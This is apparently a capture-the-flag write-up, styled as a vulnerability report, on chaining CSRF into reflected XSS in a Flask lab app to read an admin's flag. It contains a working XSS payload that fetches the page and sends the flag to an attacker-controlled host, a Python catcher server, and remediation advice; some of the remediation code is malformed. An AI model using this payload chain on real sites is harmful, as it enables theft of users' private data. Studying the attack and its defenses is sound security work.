ONLY FOR LEARNING POURPOSES


___*****Report 2: CSRF to XSS Leading to Flag Exfiltration via Direct Page Fetch*****___

Vulnerability Report: CSRF to Reflected XSS Enabling Server-Side Page Reading
Severity: High
CVSS Score: 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
CWE: CWE-352 (Cross-Site Request Forgery), CWE-79 (Cross-Site Scripting)
Affected Endpoint: /ephemeral (GET), / (GET)
Vector Chain: CSRF → Reflected XSS → Same-Origin Page Fetch → Flag Exfiltration

___Summary___
A Cross-Site Request Forgery (CSRF) vulnerability in the /ephemeral endpoint allows an attacker to inject 
JavaScript via Reflected XSS. Although the session cookie is protected with the HttpOnly flag, the XSS can 
bypass this by performing a fetch() request to read the home page (/) directly. The response contains the flag, 
which is then exfiltrated to an attacker-controlled server. This demonstrates that HttpOnly cookies are not sufficient 
to protect against XSS when the attacker can read the page content directly.

___Vulnerability Details___

1. CSRF to Reflected XSS (Same as CSRF-4)
The /ephemeral endpoint reflects the msg parameter without sanitization, allowing XSS injection.
2. HttpOnly Cookie Protections (Bypassed)
python
flask.session["username"] = username
Flask's default session cookie is:
HttpOnly: True (prevents document.cookie access)
Secure: False (in lab environment)
SameSite: Lax (in lab environment)

3. Information Disclosure via Same-Origin Fetch
Once XSS is achieved, the attacker's code runs on the same origin (challenge.localhost). This
allows unrestricted access to any page on the same domain, as SOP does not block same-origin requests.


***Vulnerable Code - Home Page:***

/for post in db.execute("SELECT * FROM posts").fetchall():
/    page += f"""<h2>Author: {post["author"]}</h2>"""
/    if post["author"] == username:
/        page += "<b>YOUR POST:</b> " + post["content"] + "<hr>\n"
/    elif username == "admin":
/        page += "<b>NON-ADMIN POST HIDDEN FOR SAFETY</b>"
/    elif post["published"]:
/        page += post["content"] + "<hr>\n"
/The admin's flag post is displayed in the HTML source, making it accessible via the response text.
/

Proof of Concept

Attack Flow
Attacker hosts malicious page
Victim (authenticated admin) visits attacker's page
CSRF redirects to /ephemeral with XSS payload
XSS payload makes a fetch('/') request
Response contains the flag in the HTML
Flag is extracted using regex and sent to attacker's server


Malicious HTML Page (index.html)

/<!DOCTYPE html>
/<html>
/<body>
/    <script>
/        // XSS payload that fetches and extracts the flag
/        var xss_payload = '<img src=x onerror="' + 
/           'fetch(\'/\').then(r=>r.text()).then(html=>{' +
/            'var m=html.match(/pwn\\.college\\{[^}]+\\}/);' +
/            'if(m)new Image().src=\'http://hacker.localhost:1337/\'+encodeURIComponent(m[0])' +
/            '})' +
/            '">';
/        
/        // CSRF redirect to trigger the XSS
/        window.location.href = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(xss_payload);
/    </script>
/</body>
/</html>


Flag Catcher Server (server.py)

/#!/usr/bin/env python3
/from http.server import HTTPServer, BaseHTTPRequestHandler
/
/class FlagHandler(BaseHTTPRequestHandler):
/    def do_GET(self):
/        print(f"\n[!] Request: {self.path}")
/        
/        if 'pwn.college' in self.path:
/            print("\n" + "="*50)
/            print("[+] FLAG EXFILTRATED SUCCESSFULLY!")
/            print(f"[+] Flag: {self.path}")
/            print("="*50 + "\n")
/        
/        self.send_response(200)
/        self.send_header('Content-Type', 'text/html')
/        self.end_headers()
/        self.wfile.write(b'OK')
/
/server = HTTPServer(('0.0.0.0', 1337), FlagHandler)
/server.serve_forever()


Host Malicious Page:
Place index.html in the server directory

Trigger Attack:
Visit /challenge/victim or have admin visit http://hacker.localhost:1337/

Flag Exfiltrated:

text
Received: /pwn.college%7B48NWNm------N1Er6O7q0-uhEUD_V.QXwADNzwCO2UjN3EzW%7D

[+] FLAG EXFILTRATED SUCCESSFULLY!
[+] Flag: /pwn.college%7B48NWNm------N1Er6O7q0-uhEUD_V.QXwADNzwCO2UjN3EzW%7D

Impact
Impact Area	Description
Sensitive Data Exposure	Full flag (admin credential) is exfiltrated
Confidentiality Breach	Complete information disclosure
HttpOnly Bypass	Demonstrates that HttpOnly is insufficient
Why HttpOnly Was Bypassed
Protection	What It Prevents	Why It Failed
HttpOnly	document.cookie access	XSS fetches the page directly, not the cookie
SameSite	Cross-origin requests with cookies	XSS executes same-origin, so cookies are sent
SOP	Cross-origin reading	XSS makes same-origin requests, which are allowed


Remediation Recommendations

1. Comprehensive Input Sanitization
All user input must be sanitized before rendering:

/from markupsafe import escape
/@app.route("/ephemeral", methods=["GET"])
/def challenge_ephemeral():
/    msg = flask.request.args.get("msg", "(none)")
/    return f"""
/        html><body>
/        h1>You have received an ephemeral message!</h1>
/        The message: {escape(msg)}
/        /body></html>
/    """

2. Implement Content Security Policy (CSP)

/@app.after_request
/def add_csp(response):
/    response.headers['Content-Security-Policy'] = (
/        "default-src 'self'; "
/        "script-src 'self'; "
/        "style-src 'self'; "
/        "img-src 'self'; "
/        "object-src 'none'"
/    )
/    return response

3. Use a Proper Templating Engine with Auto-Escaping
Flask's render_template_string() provides auto-escaping when used correctly:

python
from flask import render_template_string

/@app.route("/ephemeral", methods=["GET"])
/def challenge_ephemeral():
/    msg = flask.request.args.get("msg", "(none)")
/    return render_template_string("""
/        html><body>
/        h1>You have received an ephemeral message!</h1>
/        The message: {{ msg }}
/        /body></html>
/    """, msg=msg)

4. Implement CSRF Tokens
All endpoints that accept user input should validate CSRF tokens:

/import secrets
/@app.route("/ephemeral", methods=["GET"])
/def challenge_ephemeral():
/    if 'msg' in flask.request.args:
/        if flask.request.args.get('csrf_token') != flask.session.get('csrf_token'):
/            flask.abort(403, "Invalid CSRF token")


5. Avoid Displaying Sensitive Data
Sensitive data should not be displayed in the response:

python
if username == "admin":
    # Do NOT display admin posts
    page += "<b>ADMIN POSTS ARE CONFIDENTIAL</b>"


    
Additional Notes

Defense-in-Depth Recommendations
Layer	Protection
Input Layer	Validate and sanitize all user input
Output Layer	Escape all user-controlled output
HTTP Headers	CSP, X-XSS-Protection, X-Content-Type-Options
Session Management	HttpOnly, Secure, SameSite=Strict cookies
Application Logic	Use CSRF tokens for all state-changing requests
Infrastructure	Web Application Firewall (WAF)


Why This Attack Succeeded
No CSRF Protection: The /ephemeral endpoint didn't require CSRF tokens

No Input Sanitization: The msg parameter was directly reflected
No Output Encoding: The response was generated via f-strings without escaping
Sensitive Data Displayed: The flag was visible in the HTML response
Lack of CSP: No policy to restrict script execution or data exfiltration

